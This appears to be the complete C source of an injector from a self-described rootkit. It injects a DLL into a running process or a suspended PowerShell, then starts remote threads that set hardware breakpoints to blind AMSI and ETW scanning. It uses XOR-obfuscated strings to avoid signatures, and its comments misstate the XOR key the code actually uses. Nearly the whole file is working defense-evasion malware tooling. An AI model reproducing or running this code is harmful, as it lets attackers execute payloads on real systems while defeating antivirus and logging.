/*
 * cheyanne_inject_annotated.c — Phase 4 Process Injector (Annotated)
 * ═══════════════════════════════════════════════════════════════════
 * CHEYANNE ROOTKIT — 22DIV / george wu
 *
 * PURPOSE:
 *   Injector for cheyanne_inject.dll. Classic DLL injection via
 *   VirtualAllocEx + WriteProcessMemory + CreateRemoteThread(LoadLibraryA).
 *   After DLL loads, starts VdrWatch watchdog thread for periodic
 *   thread re-enumeration.
 *
 *   Two modes:
 *     1. Inject into running process by PID
 *     2. Spawn PowerShell with CREATE_SUSPENDED, inject before any
 *        user code runs (AMSI blind from first instruction)
 *
 * PREREQUISITES:
 *   cheyanne_inject.dll must be in the same directory as this EXE.
 *   Target process must be same integrity level (standard user).
 *
 * COMPILE:
 *   cl.exe injection\cheyanne_inject_annotated.c /Fe:injection\cheyanne_inject.exe /O1 /GS- /utf-8
 *
 * USAGE:
 *   cheyanne_inject.exe <PID>      — inject into running process
 *   cheyanne_inject.exe --spawn    — CREATE_SUSPENDED PowerShell + inject + resume
 *
 * SIGNATURE SET: HOTEL (XOR key 0x77)
 */

#include <windows.h>
#include <tlhelp32.h>
#include <string.h>
#include <stdio.h>

#define XOR_KEY 0xBD

/* ═══════════════════════════════════════════════════════════════════
 * XOR-ENCODED STRINGS (key 0x77, signature set HOTEL)
 * ═══════════════════════════════════════════════════════════════════ */

/* "powershell.exe" XOR 0x77 */
static const unsigned char xPowerShell[] = {
    0xCD, 0xD2, 0xCA, 0xD8, 0xCF, 0xCE, 0xD5, 0xD8,
    0xD1, 0xD1, 0x93, 0xD8, 0xC5, 0xD8
};
#define xPowerShell_LEN 14

/* "cheyanne_inject.dll" XOR 0x77 */
static const unsigned char xDllName[] = {
    0xCB, 0xDC, 0xD9, 0xD8, 0xCF, 0xE2, 0xD4, 0xD3,
    0xD7, 0xD8, 0xDE, 0xC9, 0x93, 0xD9, 0xD1, 0xD1
};
#define xDllName_LEN 16

/* "VdrInit" XOR 0x77 */
static const unsigned char xInitFunc[] = {
    0xEB, 0xD9, 0xCF, 0xF4, 0xD3, 0xD4, 0xC9
};
#define xInitFunc_LEN 7

/* "VdrWatch" XOR 0x77 */
static const unsigned char xWatchFunc[] = {
    0xEB, 0xD9, 0xCF, 0xEA, 0xDC, 0xC9, 0xDE, 0xD5
};
#define xWatchFunc_LEN 8

/* ═══════════════════════════════════════════════════════════════════
 * CONSOLE OUTPUT
 * ═══════════════════════════════════════════════════════════════════ */

static HANDLE hStdOut;
static void color(WORD c) { SetConsoleTextAttribute(hStdOut, c); }

#define RED     (FOREGROUND_RED | FOREGROUND_INTENSITY)
#define GREEN   (FOREGROUND_GREEN | FOREGROUND_INTENSITY)
#define YELLOW  (FOREGROUND_RED | FOREGROUND_GREEN | FOREGROUND_INTENSITY)
#define CYAN    (FOREGROUND_GREEN | FOREGROUND_BLUE | FOREGROUND_INTENSITY)
#define WHITE   (FOREGROUND_RED | FOREGROUND_GREEN | FOREGROUND_BLUE | FOREGROUND_INTENSITY)

/* ═══════════════════════════════════════════════════════════════════
 * XOR DECODE (in-place, matching dark_room pattern)
 * ═══════════════════════════════════════════════════════════════════ */

static void xor_decode(unsigned char *buf, int len) {
    int i;
    for (i = 0; i < len; i++) buf[i] ^= XOR_KEY;
}

/* ═══════════════════════════════════════════════════════════════════
 * DLL PATH CONSTRUCTION
 * ═══════════════════════════════════════════════════════════════════
 * Constructs full path to cheyanne_inject.dll by finding the injector's
 * own directory and appending the DLL filename.
 * ═══════════════════════════════════════════════════════════════════ */

static int get_dll_path(char *out, int outLen) {
    char *lastSlash;
    unsigned char dllName[32];

    if (!GetModuleFileNameA(NULL, out, outLen))
        return 0;

    lastSlash = strrchr(out, '\\');
    if (!lastSlash)
        return 0;

    lastSlash[1] = '\0';

    memcpy(dllName, xDllName, xDllName_LEN);
    xor_decode(dllName, xDllName_LEN);
    dllName[xDllName_LEN] = 0;

    strcat(out, (char *)dllName);
    memset(dllName, 0, sizeof(dllName));

    return 1;
}

/* ═══════════════════════════════════════════════════════════════════
 * REMOTE MODULE LOOKUP
 * ═══════════════════════════════════════════════════════════════════
 * After injecting the DLL, find its base address in the target process
 * using CreateToolhelp32Snapshot(TH32CS_SNAPMODULE). This gives us
 * the full 64-bit base, avoiding the 32-bit truncation issue with
 * GetExitCodeThread on x64.
 * ═══════════════════════════════════════════════════════════════════ */

static HMODULE get_remote_module(DWORD pid, const char *modName) {
    HANDLE hSnap;
    MODULEENTRY32 me;

    hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPMODULE | TH32CS_SNAPMODULE32, pid);
    if (hSnap == INVALID_HANDLE_VALUE)
        return NULL;

    me.dwSize = sizeof(MODULEENTRY32);
    if (Module32First(hSnap, &me)) {
        do {
            if (_stricmp(me.szModule, modName) == 0) {
                CloseHandle(hSnap);
                return (HMODULE)me.modBaseAddr;
            }
        } while (Module32Next(hSnap, &me));
    }

    CloseHandle(hSnap);
    return NULL;
}

/* ═══════════════════════════════════════════════════════════════════
 * CLASSIC DLL INJECTION + WATCHDOG
 * ═══════════════════════════════════════════════════════════════════
 * Step 1: VirtualAllocEx  — allocate buffer in target for DLL path string
 * Step 2: WriteProcessMemory — write DLL full path into allocated buffer
 * Step 3: CreateRemoteThread(LoadLibraryA) — target loads our DLL
 * Step 4: Wait for DLL load to complete
 * Step 5: Resolve VdrWatch in target via module base + local offset
 * Step 6: CreateRemoteThread(VdrWatch) — start periodic thread watcher
 *
 * Access rights (minimum required):
 *   PROCESS_CREATE_THREAD    — CreateRemoteThread
 *   PROCESS_VM_OPERATION     — VirtualAllocEx
 *   PROCESS_VM_WRITE         — WriteProcessMemory
 *   PROCESS_VM_READ          — Module enumeration
 *   PROCESS_QUERY_INFORMATION — Module enumeration
 *
 * Returns TRUE on success, FALSE on failure.
 * ═══════════════════════════════════════════════════════════════════ */

#define INJECT_ACCESS (PROCESS_CREATE_THREAD | PROCESS_VM_OPERATION | \
                       PROCESS_VM_WRITE | PROCESS_VM_READ | \
                       PROCESS_QUERY_INFORMATION)

static BOOL inject_and_watch(HANDLE hProcess, DWORD pid, const char *dllPath) {
    SIZE_T pathLen;
    LPVOID pRemoteBuf;
    SIZE_T written;
    HANDLE hThread;
    HMODULE hRemote, hLocal;
    FARPROC pLocalInit, pLocalWatch;
    DWORD_PTR initOffset, pRemoteInit;
    DWORD_PTR offset, pRemoteWatch;
    unsigned char initName[16];
    unsigned char watchName[16];
    unsigned char dllNameBuf[32];

    pathLen = strlen(dllPath) + 1;

    /* Step 1: Allocate buffer in target for DLL path string */
    color(YELLOW);
    printf("  [*] Allocating %zu bytes in target...\n", pathLen);

    pRemoteBuf = VirtualAllocEx(hProcess, NULL, pathLen,
                                 MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (!pRemoteBuf) {
        color(RED);
        printf("  [!] VirtualAllocEx failed: %lu\n", GetLastError());
        return FALSE;
    }
    color(GREEN);
    printf("  [+] Remote buffer at 0x%p\n", pRemoteBuf);

    /* Step 2: Write DLL path into target */
    if (!WriteProcessMemory(hProcess, pRemoteBuf, dllPath, pathLen, &written)) {
        color(RED);
        printf("  [!] WriteProcessMemory failed: %lu\n", GetLastError());
        VirtualFreeEx(hProcess, pRemoteBuf, 0, MEM_RELEASE);
        return FALSE;
    }
    color(GREEN);
    printf("  [+] Wrote %zu bytes (DLL path)\n", written);

    /* Step 3: CreateRemoteThread with LoadLibraryA as start routine.
     * LoadLibraryA address is the same in all processes on the same boot
     * (ASLR shared mapping for kernel32.dll). We take our own address. */
    color(YELLOW);
    printf("  [*] Starting LoadLibraryA thread in target...\n");

    hThread = CreateRemoteThread(hProcess, NULL, 0,
        (LPTHREAD_START_ROUTINE)LoadLibraryA,
        pRemoteBuf, 0, NULL);
    if (!hThread) {
        color(RED);
        printf("  [!] CreateRemoteThread failed: %lu\n", GetLastError());
        VirtualFreeEx(hProcess, pRemoteBuf, 0, MEM_RELEASE);
        return FALSE;
    }
    color(GREEN);
    printf("  [+] Injection thread started\n");

    /* Step 4: Wait for DLL to load */
    color(YELLOW);
    printf("  [*] Waiting for DLL load...\n");
    WaitForSingleObject(hThread, 10000);
    CloseHandle(hThread);

    /* Step 5: Find our DLL's base in the target process.
     * TH32CS_SNAPMODULE gives us the full 64-bit base address,
     * avoiding the GetExitCodeThread 32-bit truncation issue on x64. */
    memcpy(dllNameBuf, xDllName, xDllName_LEN);
    xor_decode(dllNameBuf, xDllName_LEN);
    dllNameBuf[xDllName_LEN] = 0;

    hRemote = get_remote_module(pid, (char *)dllNameBuf);
    memset(dllNameBuf, 0, sizeof(dllNameBuf));

    if (!hRemote) {
        color(RED);
        printf("  [!] DLL not found in target — injection may have failed\n");
        printf("  [!] DllMain still ran — initial thread blind is active\n");
        printf("  [!] VdrWatch skipped (no periodic re-enumeration)\n");
        return TRUE;
    }
    color(GREEN);
    printf("  [+] DLL loaded at 0x%p in target\n", (void *)hRemote);

    /* Step 6: Load DLL locally to resolve export offsets.
     * DONT_RESOLVE_DLL_REFERENCES: loads for GetProcAddress only,
     * does NOT call DllMain (no side effects in injector process). */
    hLocal = LoadLibraryExA(dllPath, NULL, DONT_RESOLVE_DLL_REFERENCES);
    if (!hLocal) {
        color(YELLOW);
        printf("  [*] Could not load DLL locally — VdrInit/VdrWatch skipped\n");
        return TRUE;
    }

    /* Step 6a: Resolve VdrInit export (Direction 1 — deferred init) */
    memcpy(initName, xInitFunc, xInitFunc_LEN);
    xor_decode(initName, xInitFunc_LEN);
    initName[xInitFunc_LEN] = 0;

    pLocalInit = GetProcAddress(hLocal, (char *)initName);
    memset(initName, 0, sizeof(initName));

    /* Step 6b: Resolve VdrWatch export (watchdog thread) */
    memcpy(watchName, xWatchFunc, xWatchFunc_LEN);
    xor_decode(watchName, xWatchFunc_LEN);
    watchName[xWatchFunc_LEN] = 0;

    pLocalWatch = GetProcAddress(hLocal, (char *)watchName);
    memset(watchName, 0, sizeof(watchName));

    pRemoteInit = 0;
    pRemoteWatch = 0;

    if (pLocalInit) {
        initOffset = (DWORD_PTR)pLocalInit - (DWORD_PTR)hLocal;
        pRemoteInit = (DWORD_PTR)hRemote + initOffset;
    }
    if (pLocalWatch) {
        offset = (DWORD_PTR)pLocalWatch - (DWORD_PTR)hLocal;
        pRemoteWatch = (DWORD_PTR)hRemote + offset;
    }
    FreeLibrary(hLocal);

    /* Step 7: Start VdrInit — all HWBP init outside loader lock.
     * Wait for completion before starting watchdog. */
    if (pRemoteInit) {
        color(GREEN);
        printf("  [+] VdrInit offset: 0x%llX\n", (unsigned long long)initOffset);
        printf("  [+] Remote VdrInit: 0x%p\n", (void *)pRemoteInit);

        color(YELLOW);
        printf("  [*] Starting VdrInit thread...\n");

        hThread = CreateRemoteThread(hProcess, NULL, 0,
            (LPTHREAD_START_ROUTINE)pRemoteInit, NULL, 0, NULL);
        if (!hThread) {
            color(RED);
            printf("  [!] VdrInit thread failed: %lu\n", GetLastError());
            return FALSE;
        }
        WaitForSingleObject(hThread, 10000);
        CloseHandle(hThread);

        color(GREEN);
        printf("  [+] VdrInit completed — HWBP armed\n");
    } else {
        color(YELLOW);
        printf("  [*] VdrInit not found — DllMain init assumed\n");
    }

    /* Step 8: Start VdrWatch for periodic thread re-enumeration */
    if (!pRemoteWatch) {
        color(YELLOW);
        printf("  [*] VdrWatch export not found — watchdog skipped\n");
        return TRUE;
    }

    color(GREEN);
    printf("  [+] VdrWatch offset: 0x%llX\n", (unsigned long long)offset);
    printf("  [+] Remote VdrWatch: 0x%p\n", (void *)pRemoteWatch);

    color(YELLOW);
    printf("  [*] Starting VdrWatch thread...\n");

    hThread = CreateRemoteThread(hProcess, NULL, 0,
        (LPTHREAD_START_ROUTINE)pRemoteWatch, NULL, 0, NULL);
    if (!hThread) {
        color(YELLOW);
        printf("  [*] VdrWatch thread failed: %lu — initial blind still active\n",
               GetLastError());
        return TRUE;
    }
    CloseHandle(hThread);

    color(GREEN);
    printf("  [+] VdrWatch started — periodic thread re-enumeration active\n");

    return TRUE;
}

/* ═══════════════════════════════════════════════════════════════════
 * SPAWN + INJECT (CREATE_SUSPENDED)
 * ═══════════════════════════════════════════════════════════════════
 * Creates PowerShell with CREATE_SUSPENDED flag. At this point:
 *   - ntdll.dll and kernel32.dll are loaded
 *   - amsi.dll is NOT loaded (loaded later during PS init)
 *   - Main thread is frozen at the process entry point
 *
 * We inject the DLL BEFORE resuming. DllMain calls LoadLibrary
 * to pull in amsi.dll and set HWBP on AmsiScanBuffer before
 * PowerShell ever calls it. When we resume, AMSI is already blind.
 *
 * This is the cleanest injection — zero race conditions.
 * ═══════════════════════════════════════════════════════════════════ */

static BOOL spawn_and_inject(const char *dllPath) {
    STARTUPINFOA si;
    PROCESS_INFORMATION pi;
    unsigned char cmd[32];

    memset(&si, 0, sizeof(si));
    si.cb = sizeof(si);
    memset(&pi, 0, sizeof(pi));

    memcpy(cmd, xPowerShell, xPowerShell_LEN);
    xor_decode(cmd, xPowerShell_LEN);
    cmd[xPowerShell_LEN] = 0;

    color(YELLOW);
    printf("  [*] Spawning suspended process...\n");

    if (!CreateProcessA(NULL, (LPSTR)cmd, NULL, NULL, FALSE,
                        CREATE_SUSPENDED | CREATE_NEW_CONSOLE,
                        NULL, NULL, &si, &pi)) {
        color(RED);
        printf("  [!] CreateProcess failed: %lu\n", GetLastError());
        memset(cmd, 0, sizeof(cmd));
        return FALSE;
    }
    memset(cmd, 0, sizeof(cmd));

    color(GREEN);
    printf("  [+] Spawned PID %lu (suspended)\n", pi.dwProcessId);
    printf("  [+] Main thread ID: %lu (suspend count: 1)\n", pi.dwThreadId);

    /* Inject DLL while main thread is suspended */
    color(YELLOW);
    printf("\n  --- INJECTING INTO SUSPENDED PROCESS ---\n\n");

    if (!inject_and_watch(pi.hProcess, pi.dwProcessId, dllPath)) {
        color(RED);
        printf("  [!] Injection failed — terminating suspended process\n");
        TerminateProcess(pi.hProcess, 1);
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
        return FALSE;
    }

    /* Resume main thread — PowerShell starts with AMSI already blind.
     * ResumeThread decrements suspend count from 1 to 0 — thread runs.
     * DR registers were set by DllMain's blind_all_threads. */
    color(YELLOW);
    printf("\n  [*] Resuming main thread...\n");

    DWORD prevCount = ResumeThread(pi.hThread);
    color(GREEN);
    printf("  [+] Resumed (prev suspend count: %lu)\n", prevCount);

    printf("\n");
    color(CYAN);
    printf("  +======================================================+\n");
    printf("  |  INJECTION COMPLETE — PID %lu                    \n", pi.dwProcessId);
    printf("  +======================================================+\n");
    color(WHITE);
    printf("  |  AMSI:     BLIND (DR0 on AmsiScanBuffer)             |\n");
    printf("  |  ETW:      BLIND (DR1 on EtwEventWrite)              |\n");
    printf("  |  Watchdog: VdrWatch active (2s re-enum)              |\n");
    printf("  |  Memory:   0 bytes modified                          |\n");
    printf("  +======================================================+\n");
    printf("  |  Test: 'AMSI Test Sample: 7e72c3ce-861b-4339'       |\n");
    printf("  |  Expected: no detection (AMSI blind)                 |\n");
    printf("  +======================================================+\n");

    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);
    return TRUE;
}

/* ═══════════════════════════════════════════════════════════════════
 * MAIN
 * ═══════════════════════════════════════════════════════════════════ */

int main(int argc, char **argv) {
    char dllPath[MAX_PATH];
    DWORD targetPid;
    HANDLE hProcess;

    hStdOut = GetStdHandle(STD_OUTPUT_HANDLE);

#ifdef VDR_DEBUG
    color(CYAN);
    printf("\n");
    printf("  +======================================================+\n");
    printf("  |  CHEYANNE INJECT — 22DIV / george wu                 |\n");
    printf("  |  Phase 4: DLL Injection + HWBP (HOTEL)               |\n");
    printf("  +======================================================+\n");
    printf("  |  Mode 1: cheyanne_inject.exe <PID>                   |\n");
    printf("  |  Mode 2: cheyanne_inject.exe --spawn                |\n");
    printf("  +======================================================+\n\n");
    color(WHITE);
#endif

    if (argc < 2) {
#ifdef VDR_DEBUG
        color(RED);
        printf("  [!] Usage: cheyanne_inject.exe <PID|--spawn>\n");
        printf("  [!]   <PID>    — inject into running process\n");
        printf("  [!]   --spawn  — CREATE_SUSPENDED PowerShell\n");
#endif
        return 1;
    }

    /* Construct full path to DLL */
    if (!get_dll_path(dllPath, MAX_PATH)) {
        color(RED);
        printf("  [!] Could not determine DLL path\n");
        return 1;
    }

    /* Verify DLL exists */
    if (GetFileAttributesA(dllPath) == INVALID_FILE_ATTRIBUTES) {
        color(RED);
        printf("  [!] DLL not found: %s\n", dllPath);
        printf("  [!] Place DLL in the same directory\n");
        return 1;
    }
    color(GREEN);
    printf("  [+] DLL: %s\n", dllPath);

    /* ---- MODE: --spawn ---- */
    if (strcmp(argv[1], "--spawn") == 0) {
        printf("\n  --- MODE: CREATE_SUSPENDED INJECTION ---\n\n");
        if (!spawn_and_inject(dllPath))
            return 1;
#ifdef VDR_DEBUG
        color(WHITE);
        printf("\n  -- CHEYANNE INJECT COMPLETE --\n\n");
#endif
        return 0;
    }

    /* ---- MODE: PID injection ---- */
    targetPid = (DWORD)atoi(argv[1]);
    if (targetPid == 0) {
        color(RED);
        printf("  [!] Invalid PID: %s\n", argv[1]);
        return 1;
    }

    printf("\n  --- MODE: PID INJECTION (target: %lu) ---\n\n", targetPid);

    hProcess = OpenProcess(INJECT_ACCESS, FALSE, targetPid);
    if (!hProcess) {
        color(RED);
        printf("  [!] OpenProcess(%lu) failed: %lu\n", targetPid, GetLastError());
        printf("  [!] Ensure target is same integrity level\n");
        return 1;
    }
    color(GREEN);
    printf("  [+] Opened process %lu\n", targetPid);

    if (!inject_and_watch(hProcess, targetPid, dllPath)) {
        CloseHandle(hProcess);
        return 1;
    }

#ifdef VDR_DEBUG
    printf("\n");
    color(CYAN);
    printf("  +======================================================+\n");
    printf("  |  INJECTION COMPLETE — PID %lu                    \n", targetPid);
    printf("  +======================================================+\n");
    color(WHITE);
    printf("  |  AMSI:     BLIND (DR0 on AmsiScanBuffer)             |\n");
    printf("  |  ETW:      BLIND (DR1 on EtwEventWrite)              |\n");
    printf("  |  Watchdog: VdrWatch active (2s re-enum)              |\n");
    printf("  |  Memory:   0 bytes modified                          |\n");
    printf("  +======================================================+\n");
#endif

    CloseHandle(hProcess);
#ifdef VDR_DEBUG
    color(WHITE);
    printf("\n  -- CHEYANNE INJECT COMPLETE --\n\n");
#endif

    return 0;
}
